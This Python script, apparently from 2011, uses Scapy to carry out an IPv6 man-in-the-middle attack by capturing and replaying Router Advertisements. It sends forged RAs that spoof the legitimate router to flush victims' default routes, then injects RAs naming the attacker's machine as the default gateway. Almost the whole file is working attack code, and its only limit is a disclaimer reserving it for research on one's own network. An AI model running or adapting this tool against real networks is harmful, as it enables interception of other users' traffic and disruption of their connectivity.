#! /usr/bin/env python

#############################################################################
##                                                                         ##
## ra_replay.py                                                            ##
##                                                                         ##
## NDP Man in the middle (ICMPv6/NDP/RA)                                   ##
## Capture, alter, and replay ICMPv6 RA packets                            ##
##                                                                         ##
## Use this script only on your own devices and your own network!          ##
## This script is for research and academic purposes only!                 ##
##                                                                         ##
## Copyright (C) 2011 : Benjamin Bachelart <ben@bashy.eu>                  ##
## http://blog.bashy.eu/                                                   ##
##                                                                         ##
## This program is under CC LICENSE 3.0 BY-NC-SA :                         ##
## http://creativecommons.org/licenses/by-nc-sa/3.0/                       ##
##                                                                         ##
## There is NO warranty provided with this software.                       ##
##                                                                         ##
## Type python ra_replay.py --help for syntax                              ##
## Version : 0.2 (24/11/2011)                                              ##
##                                                                         ##
#############################################################################

from scapy.all import *
import sys, getopt, re, time

def usage(): print "Usage: python ra_replay.py [-h | --help] [-v | --verbose] [-f | --without-flushpacket] [-t | --display-time] interface mac_target_addr mac_self_addr IPv6_self_lladdr\n\nThis script is under CC LICENSE 3.0 BY-NC-SA.\n\nFeel free to report any bug or suggestion to <ben@bashy.eu>."

try:
 opts, args = getopt.getopt(sys.argv[1:], "hvft", ["help", "verbose", "without-flushpacket", "display-time"])
except getopt.GetoptError, err:
 print str(err)
 usage()
 exit(1)

# default values for optional parameters
flushPacket = True  # This defines default action when one RA packet is caught, True value will send a RA packet that will flush default route on devices whereas False won't.
displayTime = False # This defines default behavior regarding time displaying on output, True value will display it by default whereas False won't.
verbose = False     # This defines default level of verbosity regarding output.

for opt, arg in opts:
 if opt in ('-h', '--help'):
  usage()
  exit()
 elif opt in ('-v', '--verbose'):
  verbose = True
 elif opt in ('-f', '--without-flushpacket'):
  flushPacket = False
 elif opt in ('-t', '--display-time'):
  displayTime = True

if len(args) != 4:
 print 'Invalid number of arguments, 4 expected.'
 usage()
 exit(1)
else:
 if args[0] not in get_if_list():
  print 'This interface does not exist.'
  exit(1)
 else: interface = args[0]
 if re.match("^([a-fA-F0-9]{2}(:|-)){5}[a-fA-F0-9]{2}$", args[1]) is None:
  print 'Incorrect format for mac target address.\nOP:QR:ST:UV:WX:YZ format expected.'
  exit(1)
 else: mac_tgt = str.replace(args[1], '-', ':')
 if re.match("^([a-fA-F0-9]{2}(:|-)){5}[a-fA-F0-9]{2}$", args[2]) is None:
  print 'Incorrect format for mac self address.\nOP:QR:ST:UV:WX:YZ format expected.'
  exit(1)
 else: mac_self = str.replace(args[2], '-', ':')
 try:
  if not in6_islladdr(args[3]): 
   print 'The IPv6 address given is not a link-local address.'
  else: ipv6_self_address = args[3]
 except error: 
  print 'Incorrect format for ipv6 self address.'
  exit(1)


def ra_replay_cb(pkt):
 if ICMPv6ND_RA in pkt and pkt[Ether].src != mac_self and pkt[ICMPv6ND_RA].routerlifetime != 0:
  pktTime = time.strftime("%b %d %Y %H:%M:%S", time.localtime(pkt.time))+' ' if displayTime else ''
  if verbose:
   print "%s[RA Replay] - RA Packet Spotted! : mac_addr_src=%s, IPv6_lladdr_src=%s, rtrlifetime=%s, flags : M=%s O=%s" % (pktTime, pkt[Ether].src, pkt[IPv6].src, pkt[ICMPv6ND_RA].routerlifetime, pkt[ICMPv6ND_RA].M, pkt[ICMPv6ND_RA].O)
  
  # Next part is about forging flush packet (routerlifetime = 0 will flush current nodes' default route) with information caught on the RA packet previously received
  ether=Ether(src=pkt[Ether].src, dst=mac_tgt)
  ip6=IPv6(src=pkt[IPv6].src, dst='ff02::1')
  ra=ICMPv6ND_RA(M=pkt[ICMPv6ND_RA].M, O=pkt[ICMPv6ND_RA].O, chlim=pkt[ICMPv6ND_RA].chlim, routerlifetime=0, prf=pkt[ICMPv6ND_RA].prf)
  clearpkt=(ether/ip6/ra)
  txtAdd = ''
  if ICMPv6NDOptPrefixInfo in pkt:
   prefix=ICMPv6NDOptPrefixInfo(prefix=pkt[ICMPv6NDOptPrefixInfo].prefix, validlifetime=pkt[ICMPv6NDOptPrefixInfo].validlifetime, prefixlen=pkt[ICMPv6NDOptPrefixInfo].prefixlen, preferredlifetime=pkt[ICMPv6NDOptPrefixInfo].preferredlifetime)
   prefixtxt = 'PrefixInfo\n prefix=%s/%i, validlifetime=%s, preferredlifetime=%s' % (pkt[ICMPv6NDOptPrefixInfo].prefix, pkt[ICMPv6NDOptPrefixInfo].prefixlen, pkt[ICMPv6NDOptPrefixInfo].validlifetime, pkt[ICMPv6NDOptPrefixInfo].preferredlifetime)
   clearpkt=(clearpkt/prefix)
   txtAdd = prefixtxt
  if ICMPv6NDOptMTU in pkt:
   mtu=ICMPv6NDOptMTU(mtu=pkt[ICMPv6NDOptMTU].mtu)
   mtutxt = '\nMTU : mtu=%s' % pkt[ICMPv6NDOptMTU].mtu
   clearpkt=(clearpkt/mtu)
   txtAdd += mtutxt
  if ICMPv6NDOptSrcLLAddr in pkt:
   lla=ICMPv6NDOptSrcLLAddr(lladdr=pkt[ICMPv6NDOptSrcLLAddr].lladdr)
   llatxt = '\nLLAddr : %s' % pkt[ICMPv6NDOptSrcLLAddr].lladdr
   txtAdd += llatxt
   clearpkt=(clearpkt/lla)
  if ICMPv6NDOptRDNSS in pkt:
   rdnss=ICMPv6NDOptRDNSS(lifetime=pkt[ICMPv6NDOptRDNSS].lifetime, dns=pkt[ICMPv6NDOptRDNSS].dns)
   rdnsstxt = '\nRDNSS\n rdnss=%s lifetime=%s' % (pkt[ICMPv6NDOptRDNSS].dns, pkt[ICMPv6NDOptRDNSS].lifetime)
   txtAdd += rdnsstxt
   clearpkt=(clearpkt/rdnss)
  if verbose:
   print txtAdd + '\n'
  if flushPacket:
   sendp(clearpkt, iface=interface)
   if verbose:
    pTime = time.strftime("%b %d %Y %H:%M:%S", time.localtime())+' ' if displayTime else ''
    print pTime + '[RA Replay] - Flush RA Packet (rtrlifetime=0) SENT'
  
  # Next part is about forging RA packet that will set our device as default IPv6 route (only mac and ipv6 source address are altered compared to initial caught RA packet) 
  ether=Ether(src=mac_self, dst=mac_tgt)
  ip6=IPv6(src=ipv6_self_address, dst='ff02::1')
  ra=ICMPv6ND_RA(M=pkt[ICMPv6ND_RA].M, O=pkt[ICMPv6ND_RA].O, chlim=pkt[ICMPv6ND_RA].chlim, routerlifetime=pkt[ICMPv6ND_RA].routerlifetime, prf=pkt[ICMPv6ND_RA].prf)
  prefix=ICMPv6NDOptPrefixInfo(prefix=pkt[ICMPv6NDOptPrefixInfo].prefix, validlifetime=pkt[ICMPv6NDOptPrefixInfo].validlifetime, prefixlen=pkt[ICMPv6NDOptPrefixInfo].prefixlen, preferredlifetime=pkt[ICMPv6NDOptPrefixInfo].preferredlifetime)
  injpkt=ether/ip6/ra/prefix
  if ICMPv6NDOptMTU in pkt:
   mtu=ICMPv6NDOptMTU(mtu=pkt[ICMPv6NDOptMTU].mtu)
   injpkt=(injpkt/mtu)
  if ICMPv6NDOptRDNSS in pkt:
   injpkt=(injpkt/rdnss)
  if ICMPv6NDOptSrcLLAddr in pkt:
   lla=ICMPv6NDOptSrcLLAddr(lladdr=mac_self)
   injpkt=(injpkt/lla)
  sendp(injpkt, iface=interface)
  pTime = time.strftime("%b %d %Y %H:%M:%S", time.localtime())+' ' if displayTime else ''
  return pkt.sprintf(pTime + "[RA Replay] - New RA Packet SENT")


sniff(prn=ra_replay_cb, filter="icmp6", store=0, iface=interface)
